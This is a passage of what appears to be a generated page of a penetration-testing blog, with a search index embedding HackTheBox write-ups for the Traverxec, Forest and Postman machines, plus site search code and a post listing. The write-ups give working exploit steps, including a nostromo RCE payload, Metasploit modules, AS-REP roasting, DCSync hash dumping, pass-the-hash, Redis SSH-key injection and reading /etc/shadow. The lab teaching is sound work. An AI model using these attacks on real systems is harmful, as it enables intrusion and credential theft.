type( java. io. FileReader );var br = new BufferedReader(new FileReader( file_to_read ));while ((line = br. readLine()) != null) { print(line); }' | jjs$ cd /usr/lib/jvm/java-11-openjdk-amd64/bin/$ jjsjjs&gt; var BufferedReader = Java. type( java. io. BufferedReader );jjs&gt; var FileReader = Java. type( java. io. FileReader );jjs&gt; var br = new BufferedReader(new FileReader( /root/root. txt ));jjs&gt; while ((line = br. readLine()) != null) { print(line); } We can too read the shadow file to confirm the privilege escalation from this method. jjs&gt; var BufferedReader = Java. type( java. io. BufferedReader );jjs&gt; var FileReader = Java. type( java. io. FileReader );jjs&gt; var br = new BufferedReader(new FileReader( /etc/shadow ));jjs&gt; while ((line = br. readLine()) != null) { print(line); } So we can go much further in the control of our target. Trophy:  It does not matter how slowly you go as long as you do not stop.  Confucius "
+    }, {
+    "id": 28,
+    "url": "/posts/HTB-03-Pentest-Traverxec/",
+    "title": "Write-up Traverxec Machine",
+    "body": "2020/04/11 - Ref°: HTB-03-Machine — Traverxec is a Linux machine that highlights the exploitation of CVE through nostromo version 1. 9. 6 to gain first level access. Then allow the enumeration to escalate our privileges through a found and cracked backup ssh key. That to get Flag user. After that we find a script named “server-stats. sh” which allow to user David run especially command under root permission. To increase our privilege and gain root permission we use GTFOBin on journalctl and the execution of linux pager tool to allow the navigation in script result under root permission. That to get Flag root.  [1] Discovery - Figure out environment: Check all services: The nmap scan reveals SSH and Apache to be running on their usual ports. $ nmap -A -T5 10. 10. 10. 165 -p- Web: Nostromo run on the web service in version 1. 9. 6. Vulnerabilities: Here our target is Nostromo software. We check all vulnerabilities with metasploit and we find 2 vulnerabilities presents in our version. We are two CVE : 2019-16278 and 2019-16279. The first one is more interesting, it allow an RCE through directory transversal. Reviewing Code: Reference - exploit : https://www. exploit-db. com/exploits/47837 This issue is caused by a directory traversal in the function http_verify in nostromo nhttpd allowing an attacker to achieve remote code execution via a crafted HTTP request. . . . def cve(target, port, cmd):  soc = socket. socket()  soc. connect((target, int(port)))  payload = 'POST /. %0d. /. %0d. /. %0d. /. %0d. /bin/sh HTTP/1. 0\r\nContent-Length: 1\r\n\r\necho\necho\n{} 2&gt;&amp;1'. format(cmd)  soc. send(payload)  receive = connect(soc)  print(receive). . . The execution of the RCE dont need to be authenticated or have an authenticated user. Metasploit module exists. [2] Foothold - Get into the target : Obtaining Reverse Shell from CVE Exploitation: $ msfconsolemsf5 &gt; search nostromomsf5 &gt; use exploit/multi/http/nostromo_code_execmsf5 &gt; show optionsmsf5 &gt; set lhost 10. 10. 15. 122msf5 &gt; set rhost 10. 10. 10. 165msf5 &gt; checkmsf5 &gt; exploit The exploitation is successful and we have gained a foothold. Let’s appear a pseudo-terminal with this command : Reference - pseudo-terminal : https://hacktion. be/reverse-shell-exercice/ $ python -c 'import pty; pty. spawn( /bin/bash )' [3] Lateral Movement - Move through environment: Cracking Password: Enum with www-data account and check the file /etc/passwd to find all system users : David We find in nostromo folder a configuration file with reference of public_www folder below /var/nostromo/conf/nhttpd. conf We find SSH Key archive below /home/david/public_www/protected-file-area  We retrieve the private key to exploit it with JohnTheRipper on our attacking machine. Reference - johntheripper tool : https://bytesoverbombs. io/cracking-everything-with-john-the-ripper-d434f0f6dc1c $ . /ssh2john. py ~/. ssh/David &gt; David. hash$ /usr/sbin/john --wordlist=/root/Documents/wordlist/rockyou. txt David. hash We crack the password of the user David : hunter [4] Privilege Escalation - Gain higher-level permissions: GTFOBins abuse &amp; Shell Escaping: We find bash script server-stats. sh below /home/david/bin David can execute this command under root privilege without password : /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo. service | usr/bin/cat Here we want stop the script under root privilege. To do this we use 2 techniques ; GTFOBin Abuse on journalctl and Shell Escaping. We copy the script to exploit the command line like we want. We delete the command /usr/bin/cat to avoid the result of the command. david@traverxec:~$ cp server-stats. sh private. shdavid@traverxec:~$ chmod +x private. shdavid@traverxec:~$ nano private. sh -&gt; delete command /usr/bin/catBefore launch our script, we need to resize our terminal to allow the execution of the pager linux tool. Reference - Shell Escaping : https://fireshellsecurity. team/restricted-linux-shell-escaping-techniques/ “Linux pagers are simple utilities that allow us to see the output of a particular command or text file, that is too big to fit the screen, in a paged way. The most well known are more and less. ” In this situation, the result of script that appears is larger than our terminal and allow the navigation of the document under root permission. We have the possibility to abusing of GTFOBin journalctl to appear a shell under root privilege with !/bin/sh Reference - journalctl GTFOBin : https://gtfobins. github. io/gtfobins/journalctl/ Trophy:  Everything is a copy of a copy of a copy.  Chuck Palahniuk, Fight Club "
+    }, {
+    "id": 29,
+    "url": "/posts/HTB-02-Pentest-Forest/",
+    "title": "Write-up Forest Machine",
+    "body": "2020/03/21 - Ref°: HTB-02-Machine — Forest is a Windows machine that highlights the enumeration of users through the smb service and the practice of the AS-REP Roasting attack (Kerberos service) to find our first credential. This allows us to have access on the machine with evil-winrm tool and get flag user. A privilege escalation is possible when our user is in Exchange Windows permissions security group. The use of the BloodHound tool is essential to understand and identify this type of attack. Once the exploit is completed, we can attack with DCSync method to dump all the hash of the domain. And with wmiexec tool we can connect with hash of administrator and get flag root.  [1] Discovery - Figure out environment: Check all services: We find interesting services ; dns, kerberos, ldap and smb on their usual ports. $ nmap -A -T5 10. 10. 10. 161 -p- Smb: Only smb service give us essential informations with smb_enumusers module present on Metasploit. The scan show us all users present on our target : Administrator, Guest, krbtgt, sebastien, lucinda, svc-alfresco, andy, mark, santi, meepo $ msfconsolemsf5 &gt; use auxiliary/scanner/smb/smb_enumusersmsf5 &gt; set rhosts 10. 10. 10. 161msf5 &gt; exploitVulnerabilities: We have much possitiblity to exploit Active-Directory Machine. Reference - Active-Directory exploit toolbox : https://github. com/infosecn1nja/AD-Attack-Defense/blob/master/README. md Here our target is kerberos service. This service is a computer-network authentication protocol that works on the basis of tickets to allow nodes communicating over a non-secure network to prove their identity to one another in a secure manner. We have several possible attacks : AS-Rep Roasting / Kerberoasting / Pass the key / Pass the ticket / Silver ticket / Golden ticket We use AS-Rep Roasting attack to gain a foothold. This technique is simple, that allows to retrieve hash (NTLM) from users of a domain that do not require kerberos pre-authentication. The hash can then be cracked via JohnTheRipper for example. By default pre-authentication is enabled but can be disabled in the user properties via the Active Directory. Reference - AS-Rep Roasting attack : https://beta. hackndo. com/kerberos-asrep-roasting/ [2] Foothold - Get into the target : AS-Rep Roasting Attack: Creation of the userfile with all users found above. $ nano /root/Documents/writeups/forest/userfile-asrep. txtGet hash password of all users who do not require Kerberos preauthentication with GetNPUsers. py Reference - GetNPUsers. py : https://github. com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers. py $ python GetNPUsers. py htb. local/ -usersfile /root/Documents/writeups/forest/userfile-asrep. txt -format hashcat -outputfile /root/Documents/writeups/forest/hashuser. txt -dc-ip 10. 10. 10. 161We result hash NTLM of user the user svc-alfresco : $krb5asrep$23$svc-alfresco@HTB. LOCAL:4512c77868fc6faa05403bc6f5537168$3e1c84151e6c0d9e4119321f03f1f944f8779562b1736898de960760e358f1163024e8263e36e0b695bdfca3ce60e3e340b66bba1951a4b7525176323d1ac7d8b6a37608e59ca4432401c9b9e822f7e3f4b5c27f596571e70b89bf47a145d46c2d77a49a75532ff361e093c9db20c602b280d592caf932178c4c69633bebf546bdac13b558ff4c4a3b2c525f3c6d93f5d69e0cb75b2e191d1ef007c332de24a9a3a608fb6d390f9ad414ccee66c2a9bfc7baef91f0cd747606fdc121c0c4e77065a5c10289e85e8b90b0251215decbf8bf4f02bfa383b44c974a5af7aedba2f4d71fc38527b6 Cracking Password: We crack the password of the user svc-alfresco : s3rvice Reference - johntheripper tool : https://bytesoverbombs. io/cracking-everything-with-john-the-ripper-d434f0f6dc1c $ /usr/sbin/john --wordlist=/root/Documents/wordlist/rockyou. txt /root/Documents/writeups/forest/hashuser. txtWe can connect now with evil-winrm tool. This program can be used on any Microsoft Windows Servers with this feature enabled (usually at port 5985). WinRM (Windows Remote Management) is the Microsoft implementation of WS-Management Protocol. A standard SOAP based protocol that allows hardware and operating systems from different vendors to interoperate. Microsoft included it in their Operating Systems in order to make life easier to system administrators. Reference - evil-winrm tool : https://github. com/Hackplayers/evil-winrm $ evil-winrm -i 10. 10. 10. 161 -u svc-alfresco -p s3rviceThe exploitation is successful and we have gained a foothold. [3] Privilege Escalation - Gain higher-level permissions: Auditing with BloodHound: BloodHound is a tool for mapping an Active Directory environment by representing it as a graph. This representation then offers all the power of graph theory to discover paths of attack that would otherwise be difficult or impossible to detect. References - BloodHound :  https://beta. hackndo. com/bloodhound/ https://ired. team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux https://github. com/BloodHoundAD/BloodHound/wiki/getting-started https://github. com/BloodHoundAD/SharpHound$ evil-winrm -i 10. 10. 10. 161 -u svc-alfresco -p s3rvice -s  /root/Documents/exploit-Win-RM/  PS c:\Users\svc-alfresco\Documents&gt; SharpHound. ps1 PS c:\Users\svc-alfresco\Documents&gt; menu PS c:\Users\svc-alfresco\Documents&gt; Invoke-BloodHound -CollectionMethod All -JSONFolder  c:\Users\svc-alfresco\Documents We download 2020xxxxxxxxxxxxxx_BloodHound. zip and export in bloodhound on our attacking machine to audit and see all possibility of escalation. $ neo4j console----$ bloodhound Exchange Windows - ACLs abuse: A privilege escalation is possible from the Exchange Windows permissions security group to compromise an Active Directory domain. References - exploit :  https://ired. team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync https://github. com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject. md https://powersploit. readthedocs. io/en/latest/Recon/Add-DomainObjectAcl/ https://github. com/EmpireProject/EmpireAdd new user in “Exchange Windows Permissions” security group.  PS c:\Users\svc-alfresco\Documents&gt; net user privateuser45 zrc45pctVSGcNp /add /domain PS c:\Users\svc-alfresco\Documents&gt;net localgroup  Remote Management Users  privateuser45 /add PS c:\Users\svc-alfresco\Documents&gt; net group  Exchange Windows Permissions  privateuser45 /add“Remote Management Users” local group allow connection with evil winrm. Set the Ds-Replication-Get-Changes and Ds-Replication-Get-Changes-All to increase rights on the domain object with PowerViews: $ evil-winrm -i 10. 10. 10. 161 -u privateuser45 -p zrc45pctVSGcNp -s  /root/Documents/exploit-Win-RM/Empire/data/module_source/situational_awareness/network/  PS c:\Users\privateuser45\Documents&gt; powerview. ps1 PS c:\Users\privateuser45\Documents&gt; menu PS c:\Users\privateuser45\Documents&gt; Add-DomainObjectAcl -TargetIdentity  DC=htb,DC=local  -PrincipalIdentity privateuser45 -Rights DCSyncWe have now sufficient rights to dump all domain credentials (Kerberos keys, hashes, etc. ). DCSync Attack: DCSync is an attack that allows an attacker to simulate the behavior of Domain Controller (DC) in order to retrieve password hash of the entire domain via domain replication. References - DCSync Attack :  https://medium. com/@airman604/dumping-active-directory-password-hashes-deb9468d1633 https://attack. stealthbits. com/privilege-escalation-using-mimikatz-dcsyncReference - secretdump. py : https://github. com/SecureAuthCorp/impacket/blob/master/examples/secretsdump. py $ python secretsdump. py -just-dc HTB. LOCAL/private45@10. 10. 10. 161We retrieve the html hash of administrator to success a connection with wmiexec : Hash Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6::: Pass-The-Hash: Reference - Pass the Hash : https://blog. ropnop. com/practical-usage-of-ntlm-hashes/ Reference - wmiexec. py : https://github. com/SecureAuthCorp/impacket/blob/master/examples/wmiexec. py $ python wmiexec. py -hashes :32693b11e6aa90eb43d32c72a07ceea6 administrator@10. 10. 10. 161We have compromise Forest machine. Trophy:  Defenders think in lists. Attackers think in graphs. As long as this is true, attackers win.  John Lambert "
+    }, {
+    "id": 30,
+    "url": "/posts/HTB-01-Pentest-Postman/",
+    "title": "Write-up Postman Machine",
+    "body": "2020/02/02 - Ref°: HTB-01-Machine — Postman is a Linux machine that highlights the exploitation of the RCE on the Redis service to gain access and allow to enumerate to escalate our privileges through a found and cracked backup ssh key. That to get Flag user. A CVE is present in Webmin service to get root privilege and our user have sufficiently right to exploit it through Metasploit module. That to get Flag root.  [1] Discovery - Figure out environment: Check all services: We find interesting services: ssh, web, redis and webmin. $ nmap -A -T5 10. 10. 10. 160 -p-Redis: Access to the service Redis is not protected by password. Web: Webmin run on the web service in version 1. 910. Vulnerabilities: Redis is not protected by password and we can access with telnet command. We can write and push our SSH Public Key file in authorized_keys. After we are the possibility to logging on to the victim machine through SSH. The service Webmin present two CVE : 2006-3392 and 2019-12840. The second is more interesting because we can execute arbitrary commands with root privileges via the data parameter to update. cgi. But we need to have a user authorized to the “Package Updates” module. Reference - exploit CVE : https://www. cvedetails. com/cve/CVE-2019-12840/ Metasploit module exists. [2] Foothold - Get into the target : SSH Authorized Keys from RCE Execution: Reference - exploit RCE : https://packetstormsecurity. com/files/134200/Redis-Remote-Command-Execution. html $ sh-keygen -t rsa -b 2048$ (echo -e  \n\n ; cat postman. pub; echo -e  \n\n ) &gt; foo. txt$ cat /root/. ssh/foo. txt | redis-cli -h 10. 10. 10. 160 -x set s-key$ telnet 10. 10. 10. 160 6379&gt; config get dir&gt; config set dir /var/lib/redis/. ssh&gt; config set dbfilename authorized_keys&gt; save&gt; quit$ ssh redis@10. 10. 10. 160 -i postman The exploitation is successful and we have gained a foothold. [3] Lateral Movement - Move through environment: Cracking Password: With locate command we found a backup of ssh key and its owner is Matt. $ locate id_rsa$ ls -la /opt/ We retrieve the private key to exploit it with JohnTheRipper on our attacking machine. Reference - johntheripper tool : https://bytesoverbombs. io/cracking-everything-with-john-the-ripper-d434f0f6dc1c $ . /ssh2john. py ~/. ssh/Matt &gt; Matt. hash$ /usr/sbin/john --wordlist=/root/Documents/wordlist/rockyou. txt Matt. hashWe crack the password of the user Matt : computer2008. We cannot access in ssh with this user due to a restriction in the ssh configuration file. But we have the possibility to escalate with the su command from our victim machine. [4] Privilege Escalation - Gain higher-level permissions: CVE 2019-12840 Exploitation: Matt user have access on Webmin and he have sufficiently right on Package Updates module to execute CVE 2019-12840 and obtain root privilege.  $ msfconsolemsf5 &gt; search webminmsf5 &gt; use exploit/linux/http/webmin_packageup_rcemsf5 &gt; show optionsmsf5 &gt; set username Mattmsf5 &gt; set password computer2008msf5 &gt; set lhost 10. 10. 15. 122msf5 &gt; set rhost 10. 10. 10. 160msf5 &gt; set ssl truemsf5 &gt; checkmsf5 &gt; exploit$ whoamiroot$ cat /root/root. txtWe have compromise Postman machine. Trophy:  A hacker does for love what others would not do for money.  Laura Creighton "
+    }];
+
+var idx = lunr(function () {
+    this.ref('id')
+    this.field('title')
+    this.field('body')
+
+    documents.forEach(function (doc) {
+        this.add(doc)
+    }, this)
+});
+
+
+    
+function lunr_search(term) {
+    $('#lunrsearchresults').show( 1000 );
+    $( "body" ).addClass( "modal-open" );
+    
+    document.getElementById('lunrsearchresults').innerHTML = '<div id="resultsmodal" class="modal fade show d-block"  tabindex="-1" role="dialog" aria-labelledby="resultsmodal"> <div class="modal-dialog shadow-lg" role="document"> <div class="modal-content"> <div class="modal-header" id="modtit"> <button type="button" class="close" id="btnx" data-dismiss="modal" aria-label="Close"> &times; </button> </div> <div class="modal-body"> <ul class="mb-0"> </ul>    </div> <div class="modal-footer"><button id="btnx" type="button" class="btn btn-secondary btn-sm" data-dismiss="modal">Close</button></div></div> </div></div>';
+    if(term) {
+        document.getElementById('modtit').innerHTML = "<h5 class='modal-title'>Search results for '" + term + "'</h5>" + document.getElementById('modtit').innerHTML;
+        //put results on the screen.
+        var results = idx.search(term);
+        if(results.length>0){
+            //console.log(idx.search(term));
+            //if results
+            for (var i = 0; i < results.length; i++) {
+                // more statements
+                var ref = results[i]['ref'];
+                var url = documents[ref]['url'];
+                var title = documents[ref]['title'];
+                var body = documents[ref]['body'].substring(0,160)+'...';
+                document.querySelectorAll('#lunrsearchresults ul')[0].innerHTML = document.querySelectorAll('#lunrsearchresults ul')[0].innerHTML + "<li class='lunrsearchresult'><a href='" + url + "'><span class='title'>" + title + "</span><br /><small><span class='body'>"+ body +"</span><br /><span class='url'>"+ url +"</span></small></a></li>";
+            }
+        } else {
+            document.querySelectorAll('#lunrsearchresults ul')[0].innerHTML = "<li class='lunrsearchresult'>Sorry, no results found. Close & try a different search!</li>";
+        }
+    }
+    return false;
+}
+</script>
+<style>
+    .lunrsearchresult .title {color: #d9230f;}
+    .lunrsearchresult .url {color: silver;}
+    .lunrsearchresult a {display: block; color: #777;}
+    .lunrsearchresult a:hover, .lunrsearchresult a:focus {text-decoration: none;}
+    .lunrsearchresult a:hover .title {text-decoration: underline;}
+</style>
+
+
+
+
+<form class="bd-search hidden-sm-down" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+<input type="text" class="form-control text-small"  id="lunrsearch" name="q" value="" placeholder="Type keyword and enter..."> 
+</form>
+            </ul>
+        </div>
+    </div>
+    </nav>
+
+    <!-- Search Results -->
+    <div id="lunrsearchresults">
+        <ul class="mb-0"></ul>
+    </div>
+
+    <!-- Content -->
+    <main role="main" class="site-content">
+        <div class="container">
+        <div class="row mb-4">
+            <div class="col-md-12">
+            <p><b>Disclaimer:</b> All information exposed in this blog has the goal to teach you techniques used by the hackers through pentest labs and challenges provided by training platforms such as HackTheBox, RootMe or TryHackMe. Write-ups provided on this blog is for informational and educational purpose only. It's your responsibility if you decide to use informations of this blog to make illegal actions.</p>
+            </div>
+        </div>
+     
+
+    
+<!-- Begin post excerpts, let's highlight the first 4 posts on top -->
+<div class="row remove-site-content-margin">
+    
+    <!-- latest post -->
+    
+    <div class="col-md-6">
+    <div class="card border-0 mb-4 box-shadow">   
+    <a href="/posts/HTB-19-Pentest-Breadcrumbs/">
+    <div class="topfirstimage" style="background-image: url( /assets/images/breadcrumb/HTB-Badge-Breadcrumb.png); height: 200px;    background-size: cover;    background-repeat: no-repeat;"></div>     
+    </a>
+    <div class="card-body px-0 pb-0 d-flex flex-column align-items-start">
+    <h2 class="h4 font-weight-bold">
+    <a class="text-dark" href="/posts/HTB-19-Pentest-Breadcrumbs/">Breadcrumbs - Let me steal your web session!</a>
+    </h2>
+    <div>
+        <small class="d-block text-muted">
+        		<!-- Tags -->
+        		<p>
+				<span class="taglist">
+				
+				<a class="sscroll btn btn-light btn-sm font-weight-bold" href="/tags.html#windows">windows</a>
+				
+				<a class="sscroll btn btn-light btn-sm font-weight-bold" href="/tags.html#hard">hard</a>
+				
+				<a class="sscroll btn btn-light btn-sm font-weight-bold" href="/tags.html#fuzzing">fuzzing</a>
+				
+				<a class="sscroll btn btn-light btn-sm font-weight-bold" href="/tags.html#cookie hijacking">cookie hijacking</a>
+				
+				<a class="sscroll btn btn-light btn-sm font-weight-bold" href="/tags.html#json web token (jwt)">json web token (jwt)</a>
+				
+				<a class="sscroll btn btn-light btn-sm font-weight-bold" href="/tags.html#local file inclusion">local file inclusion</a>
+				
+				<a class="sscroll btn btn-light btn-sm font-weight-bold" href="/tags.html#sticky notes app">sticky notes app</a>
+				
+				<a class="sscroll btn btn-light btn-sm font-weight-bold" href="/tags.html#sql injection">sql injection</a>
+				
+				</span>
+				</p>
+            In <span class="catlist">
+                
+                <a class="text-capitalize text-muted smoothscroll" href="/categories.html#hackthebox">HackTheBox</a><span class="sep">, </span>
+                
+                <a class="text-capitalize text-muted smoothscroll" href="/categories.html#machine">Machine</a><span class="sep">, </span>
+                
+                </span> 
+        </small>
+        <small class="text-muted">
+            Jul 17, 2021
+        </small>
+    </div>
+    </div>
+    </div>
+    </div>
+    
+    <div class="col-md-6">
+        
+        <!-- second latest post --><div class="mb-3 d-flex align-items-center">                
+                
+                <div class="col-md-4">
+                <a href="/posts/HTB-18-Pentest-Doctor/">
+                 <img class="w-100" src="/assets/images/doctor/HTB-Badge-Doctor.png" alt="Write-up Doctor Machine">
+                </a>
+                </div>
+                                
+                <div>
+                    <h2 class="mb-2 h6 font-weight-bold">
+                    <a class="text-dark" href="/posts/HTB-18-Pentest-Doctor/">Write-up Doctor Machine</a>
+                    </h2>
+                    <small class="d-block text-muted">
+                        In <span class="catlist">
+                        
+                        <a class="text-capitalize text-muted smoothscroll" href="/categories.html#hackthebox">HackTheBox</a><span class="sep">, </span>
+                        
+                        <a class="text-capitalize text-muted smoothscroll" href="/categories.html#machine">Machine</a><span class="sep">, </span>
+                        
+                        </span>                   
+                    </small>
+                    <small class="text-muted">
+                        Feb 04, 2021
+                    </small>
+                </div>
+            </div>
+        
+        <!-- third latest post --><div class="mb-3 d-flex align-items-center">                
+                
+                <div class="col-md-4">
+                <a href="/posts/HTB-17-Pentest-Tabby/">
+                 <img class="w-100" src="/assets/images/tabby/HTB-Badge-Tabby.png" alt="Write-up Tabby Machine">
+                </a>
+                </div>
+                                
+                <div>
+                    <h2 class="mb-2 h6 font-weight-bold">
+                    <a class="text-dark" href="/posts/HTB-17-Pentest-Tabby/">Write-up Tabby Machine</a>
+                    </h2>
+                    <small class="d-block text-muted">
+                        In <span class="catlist">
+                        
+                        <a class="text-capitalize text-muted smoothscroll" href="/categories.html#hackthebox">HackTheBox</a><span class="sep">, </span>
+                        
+                        <a class="text-capitalize text-muted smoothscroll" href="/categories.html#machine">Machine</a><span class="sep">, </span>
+                        
+                        </span>                   
+                    </small>
+                    <small class="text-muted">
+                        Nov 07, 2020
+                    </small>
+                </div>
+            </div>
+        
+        <!-- fourth latest post --><div class="mb-3 d-flex align-items-center">                
+                
+                <div class="col-md-4">
+                <a href="/posts/HTB-16-Pentest-Admirer/">
+                <img class="w-100" src="/assets/images/admirer/HTB-Badge-Admirer.png" alt="Write-up Admirer Machine">
+                </a>
+                </div>
+                                
+                <div>
+                    <h2 class="mb-2 h6 font-weight-bold">
+                    <a class="text-dark" href="/posts/HTB-16-Pentest-Admirer/">Write-up Admirer Machine</a>
+                    </h2>
+                    <small class="d-block text-muted">
+                        In <span class="catlist">
+                        
+                        <a class="text-capitalize text-muted smoothscroll" href="/categories.html#hackthebox">HackTheBox</a><span class="sep">, </span>
+                        
+                        <a class="text-capitalize text-muted smoothscroll" href="/categories.html#machine">Machine</a><span class="sep">, </span>
+                        
+                        </span>                   
+                    </small>
+                    <small class="text-muted">
+                        Sep 26, 2020
+                    </small>
+                </div>
+            </div>
+        
+    </div>
+    
+</div>
+    
+<!-- Sticky - add sticky tag to the post you want to highlight here - tags: [sticky] -->
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+
+
+
+    
+
+
+ <!--endif page url is / -->
+    
+
+
+<!-- Now the rest of the posts with the usual loop but with an offset:4 on the first page so we can skeep the first 4 posts displayed above -->
+    
+<div class="row mt-3">
+   
+    <div class="col-md-8 main-loop">
+        
+        <h4 class="font-weight-bold spanborder"><span>All Writeups</span></h4>
+        
+
+        
+        
+            <div class="mb-5 d-flex justify-content-between main-loop-card">
+<div class="pr-3">
+	<h2 class="mb-1 h4 font-weight-bold">
+	<a class="text-dark" href="/posts/HTB-19-Pentest-Breadcrumbs/">Breadcrumbs - Let me steal your web session!</a>
+	</h2>
+	<p class="excerpt">
+	   Breadcrumbs is a vulnerable machine through :  Foothold &gt; Cookie Hijacking from LFI in php files  Lateral movement &gt; Reusing credentials plaintext  Privilege Escalation &gt; SQL...
+	</p>
+	<small class="d-block text-muted">
+		In <span class="catlist">
+		
+		<a class="text-capitalize text-muted smoothscroll" href="/categories.html#hackthebox">HackTheBox</a><span class="sep">, </span>
+		
+		<a class="text-capitalize text-muted smoothscroll" href="/categories.html#machine">Machine</a><span class="sep">, </span>
+		
+		</span>
+	</small>
+	<small class="text-muted">
+		Jul 17, 2021
+	</small>
+</div>
+
+	<div class="col-md-3 pr-0 text-right">
+	<a href="/posts/HTB-19-Pentest-Breadcrumbs/">
+	<img class="w-100" src="/assets/images/breadcrumb/HTB-Badge-Breadcrumb.png" alt="Breadcrumbs - Let me steal your web session!">
+	</a>
+	</div>
+
+</div>
+        
+        
+        
+            <div class="mb-5 d-flex justify-content-between main-loop-card">
+<div class="pr-3">
+	<h2 class="mb-1 h4 font-weight-bold">
+	<a class="text-dark" href="/posts/HTB-18-Pentest-Doctor/">Write-up Doctor Machine</a>
+	</h2>
+	<p class="excerpt">
+	   Ref°: HTB-18-Machine
+	</p>
+	<small class="d-block text-muted">
+		In <span class="catlist">
+		
+		<a class="text-capitalize text-muted smoothscroll" href="/categories.html#hackthebox">HackTheBox</a><span class="sep">, </span>
+		
+		<a class="text-capitalize text-muted smoothscroll" href="/categories.html#machine">Machine</a><span class="sep">, </span>
+		
+		</span>
+	</small>
+	<small class="text-muted">
+		Feb 04, 2021
+	</small>
+</div>
+
+	<div class="col-md-3 pr-0 text-right">
+	<a href="/posts/HTB-18-Pentest-Doctor/">
+	<img class="w-100" src="/assets/images/doctor/HTB-Badge-Doctor.png" alt="Write-up Doctor Machine">
+	</a>
+	</div>
+
+</div>
+        
+        
+        
+            <div class="mb-5 d-flex justify-content-between main-loop-card">
+<div class="pr-3">
+	<h2 class="mb-1 h4 font-weight-bold">
+	<a class="text-dark" href="/posts/HTB-17-Pentest-Tabby/">Write-up Tabby Machine</a>
+	</h2>
+	<p class="excerpt">
+	   Ref°: HTB-17-Machine
+	</p>
+	<small class="d-block text-muted">
+		In <span class="catlist">
+		
+		<a class="text-capitalize text-muted smoothscroll" href="/categories.html#hackthebox">HackTheBox</a><span class="sep">, </span>
+		
+		<a class="text-capitalize text-muted smoothscroll" href="/categories.html#machine">Machine</a><span class="sep">, </span>
+		
+		</span>
+	</small>
+	<small class="text-muted">
+		Nov 07, 2020
+	</small>
+</div>
+
+	<div class="col-md-3 pr-0 text-right">
+	<a href="/posts/HTB-17-Pentest-Tabby/">
+	<img class="w-100" src="/assets/images/tabby/HTB-Badge-Tabby.png" alt="Write-up Tabby Machine">
+	</a>
+	</div>
+
+</div>
+        
+        
+        
+            <div class="mb-5 d-flex justify-content-between main-loop-card">
+<div class="pr-3">
+	<h2 class="mb-1 h4 font-weight-bold">
+	<a class="text-dark" href="/posts/HTB-16-Pentest-Admirer/">Write-up Admirer Machine</a>
+	</h2>
+	<p class="excerpt">
+	   Ref°: HTB-16-Machine
+	</p>
+	<small class="d-block text-muted">
+		In <span class="catlist">
+		
+		<a class="text-capitalize text-muted smoothscroll" href="/categories.html#hackthebox">HackTheBox</a><span class="sep">, </span>
+		
+		<a class="text-capitalize text-muted smoothscroll" href="/categories.html#machine">Machine</a><span class="sep">, </span>
+		
+		</span>
+	</small>
+	<small class="text-muted">
+		Sep 26, 2020
+	</small>
+</div>
+
+	<div class="col-md-3 pr-0 text-right">
+	<a href="/posts/HTB-16-Pentest-Admirer/">
+	<img class="w-100" src="/assets/images/admirer/HTB-Badge-Admirer.png" alt="Write-up Admirer Machine">
+	</a>
+	</div>
+
+</div>
+        
+        
+        
+            <div class="mb-5 d-flex justify-content-between main-loop-card">
+<div class="pr-3">
+	<h2 class="mb-1 h4 font-weight-bold">
+	<a class="text-dark" href="/posts/HTB-15-Pentest-Remote/">Write-up Remote Machine</a>
+	</h2>
+	<p class="excerpt">
+	   Ref°: HTB-15-Machine
+	</p>
+	<small class="d-block text-muted">
+		In <span class="catlist">
+		
+		<a class="text-capitalize text-muted smoothscroll" href="/categories.html#hackthebox">HackTheBox</a><span class="sep">, </span>
+		
+		<a class="text-capitalize text-muted smoothscroll" href="/categories.html#machine">Machine</a><span class="sep">, </span>
+		
+		</span>
+	</small>
+	<small class="text-muted">
+		Sep 25, 2020
+	</small>
+</div>
+
+	<div class="col-md-3 pr-0 text-right">
+	<a href="/posts/HTB-15-Pentest-Remote/">
+	<img class="w-100" src="/assets/images/remote/HTB-Badge-Remote.png" alt="Write-up Remote Machine">
+	</a>
+	</div>
+
+</div>
+        
+        
+        
+            <div class="mb-5 d-flex justify-content-between main-loop-card">
+<div class="pr-3">
+	<h2 class="mb-1 h4 font-weight-bold">
+	<a class="text-dark" href="/posts/HTB-14-Pentest-Magic/">Write-up Magic Machine</a>
+	</h2>
+	<p class="excerpt">
+	   Ref°: HTB-14-Machine— Magic is a medium level linux machine. It defined by sql injection to bypass the authentication of a login page and the exploitation of payload hidden in an imag...
+	</p>
+	<small class="d-block text-muted">
+		In <span class="catlist">
+		
+		<a class="text-capitalize text-muted smoothscroll" href="/categories.html#hackthebox">HackTheBox</a><span class="sep">, </span>
+		
+		<a class="text-capitalize text-muted smoothscroll" href="/categories.html#machine">Machine</a><span class="sep">, </span>
+		
+		</span>
+	</small>
+	<small class="text-muted">
+		Aug 29, 2020
+	</small>
+</div>
+
+	<div class="col-md-3 pr-0 text-right">
+	<a href="/posts/HTB-14-Pentest-Magic/">
+	<img class="w-100" src="/assets/images/magic/HTB-Badge-Magic.png" alt="Write-up Magic Machine">
+	</a>
+	</div>
+
+</div>
+        
+        
+        
+            <div class="mb-5 d-flex justify-content-between main-loop-card">
+<div class="pr-3">
+	<h2 class="mb-1 h4 font-weight-bold">
+	<a class="text-dark" href="/posts/HTB-13-Pentest-Traceback/">Write-up Traceback Machine</a>
+	</h2>
+	<p class="excerpt">
+	   Ref°: HTB-13-Machine
+	</p>
+	<small class="d-block text-muted">
+		In <span class="catlist">
+		
+		<a class="text-capitalize text-muted smoothscroll" href="/categories.html#hackthebox">HackTheBox</a><span class="sep">, </span>
+		
+		<a class="text-capitalize text-muted smoothscroll" href="/categories.html#machine">Machine</a><span class="sep">, </span>
+		
+		</span>
+	</small>
+	<small class="text-muted">
+		Aug 15, 2020
+	</small>
+</div>
+
+	<div class="col-md-3 pr-0 text-right">
+	<a href="/posts/HTB-13-Pentest-Traceback/">
+	<img class="w-100" src="/assets/images/traceback/HTB-Badge-Traceback.png" alt="Write-up Traceback Machine">
+	</a>
+	</div>
+
